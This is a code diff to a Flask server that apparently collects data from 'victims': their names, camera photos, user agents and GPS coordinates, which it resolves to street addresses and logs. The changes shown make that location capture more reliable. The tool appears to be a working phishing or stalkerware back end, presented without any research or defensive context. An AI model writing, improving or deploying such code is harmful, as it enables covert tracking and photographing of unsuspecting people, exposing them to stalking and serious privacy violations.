@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Flask Server - Fixed 500 errors
+Flask Server - Fixed location handling
 """
 
 import os
@@ -93,7 +93,8 @@ def get_accurate_location(lat, lon):
                 'city': address.get('city', address.get('town', address.get('village', ''))),
                 'state': address.get('state', ''),
                 'postcode': address.get('postcode', ''),
-                'country': address.get('country', '')
+                'country': address.get('country', ''),
+                'display_name': data.get('display_name', '')
             }
     except Exception as e:
         logger.error(f"Location lookup error: {e}")
@@ -144,6 +145,7 @@ def submit_name():
             'permission': permission,
             'photo_count': 0,
             'location': None,
+            'location_sent': False,  # Track if location was sent
             'user_agent': request.headers.get('User-Agent', 'Unknown')
         }
         
@@ -169,22 +171,29 @@ def receive_location():
         lat = data.get('lat')
         lon = data.get('lng')
         
-        if lat and lon and ip in victims_data:
+        if lat and lon:
             # Get detailed location
             location = get_accurate_location(lat, lon)
-            victims_data[ip]['location'] = location
             
-            # Build address for logging
-            address_parts = []
-            if location.get('house_number'): address_parts.append(location['house_number'])
-            if location.get('road'): address_parts.append(location['road'])
-            if location.get('city'): address_parts.append(location['city'])
-            if location.get('country'): address_parts.append(location['country'])
+            # Update victim data
+            if ip in victims_data:
+                victims_data[ip]['location'] = location
+                victims_data[ip]['location_sent'] = True
+                
+                # Build address for logging
+                address_parts = []
+                if location.get('house_number'): address_parts.append(location['house_number'])
+                if location.get('road'): address_parts.append(location['road'])
+                if location.get('city'): address_parts.append(location['city'])
+                if location.get('country'): address_parts.append(location['country'])
+                
+                address = ', '.join(filter(None, address_parts))
+                logger.info(f"📍 {victims_data[ip].get('name', 'Unknown')} - {address}")
             
-            address = ', '.join(filter(None, address_parts))
-            logger.info(f"📍 {victims_data[ip].get('name', 'Unknown')} - {address}")
+            return jsonify({'status': 'ok', 'location': location})
         
-        return jsonify({'status': 'ok'})
+        return jsonify({'status': 'error', 'message': 'No coordinates'}), 400
+        
     except Exception as e:
         logger.error(f"Location error: {e}")
         return jsonify({'status': 'error'}), 500
@@ -213,7 +222,7 @@ def photo():
                 name = victims_data[ip].get('name', 'Unknown')
                 logger.info(f"📸 Photo from {name}")
 
-            return jsonify({'status': 'ok'})
+            return jsonify({'status': 'ok', 'count': victims_data[ip]['photo_count']})
 
         return jsonify({'status': 'error', 'message': 'No photo data'}), 400
     except Exception as e:
